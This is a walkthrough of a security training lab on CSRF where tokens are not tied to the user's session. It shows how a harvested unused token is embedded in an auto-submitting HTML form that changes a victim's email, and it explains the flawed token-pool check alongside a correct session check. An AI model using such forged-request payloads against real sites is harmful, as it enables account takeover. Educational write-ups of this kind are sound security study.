# CSRF where token is not tied to user session

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack:

- `wiener:peter`
- `carlos:montoya`

---

## 1. Detection

- Clicked `ACCESS THE LAB` and was presented with the blog page. Clicked `My Account` and logged in with `wiener:peter`, landing on `/my-account?id=wiener`.
- Inspecting the email change form revealed a CSRF token present as a hidden field, same as previous labs.
- Changed the email and captured the resulting `POST /my-account/change-email` request. The body included both the `email` and `csrf` parameter.

---

## 2. Analysing the CSRF Token

- Checked whether the token was static or dynamic across page refreshes by reading it from the DOM across multiple reloads:

```javascript
document.getElementsByName('csrf').item(0).value
```

- Got a different value each time:

```
1 - H0seJwlPAfREQwu8FcwQAxwNtb0n2kKo
2 - EkTNV9oHdzNXmZ9PkrSjNSXLEzxAG5Ql
3 - p39oTTnLG4VDOMszD3dJZgK1SsF2iMIc
```

- The token was dynamic on every page load — so reusing a previously observed token wouldn't work. The token also couldn't be predicted or guessed.
- However, the lab description calls out a key flaw: the tokens **aren't tied to a user session**. This means the server maintains a global pool of valid CSRF tokens and checks whether the submitted token exists in that pool — but doesn't verify that the token was issued to the *same user* or the *same session* making the request.

---

## 3. Exploiting the Token Pool

- The attack idea: log in as `wiener`, load the email change page, and grab a fresh, unused CSRF token. Since the server only checks whether the token exists in the pool (not who it was issued to), that token is valid for **any** user's request — including the victim's.
- Logged in as `wiener`, navigated to `/my-account`, and retrieved a fresh CSRF token from the form. Without using it (to keep it valid and in the pool), embedded it directly into the CSRF exploit payload targeting the victim:

```html
<html>
   <form enctype="application/x-www-form-urlencoded" action="https://0a3a0060030dd42c82e3ab4900b300fc.web-security-academy.net/my-account/change-email" method="POST">
      <table>
         <tr>
            <td>email</td>
            <td><input type="text" value="attacker@attacker.com" name="email"></td>
         </tr>
         <tr>
            <td>csrf</td>
            <td><input type="text" value="H0seJwlPAfREQwu8FcwQAxwNtb0n2kKo" name="csrf"></td>
         </tr>
      </table>
   </form>
   <script>
        document.forms[0].submit();
   </script>
</html>
```

> **Why this works:** A properly implemented CSRF token must be tied to both a specific session *and* a specific user — so that a token issued to `wiener`'s session cannot be used to authenticate a request made under `carlos`'s session. Here, the server maintains a shared token pool without binding each token to its originating session. When the victim's browser submits the forged POST with `wiener`'s unused token, the server looks up that token in the global pool, finds it valid, and processes the email change — completely unaware that the token was never issued to the victim's session.
>
> The pseudo code for the flawed check looks something like:
>
> ```php
> if (in_array($_POST['csrf'], $global_token_pool)) {
>     // token is valid, proceed
> } else {
>     // reject
> }
> ```
>
> Instead of the correct approach:
>
> ```php
> if ($_POST['csrf'] === $_SESSION['csrf_token']) {
>     // token matches this session, proceed
> } else {
>     // reject
> }
> ```

---

## 4. Solve the Challenge

- Hosted the payload on the exploit server and delivered it to the victim.
- The victim's browser auto-submitted the `POST` on page load. The server validated `wiener`'s unused token against the global pool, found it valid, and changed the victim's email to `attacker@attacker.com`.
- Lab solved.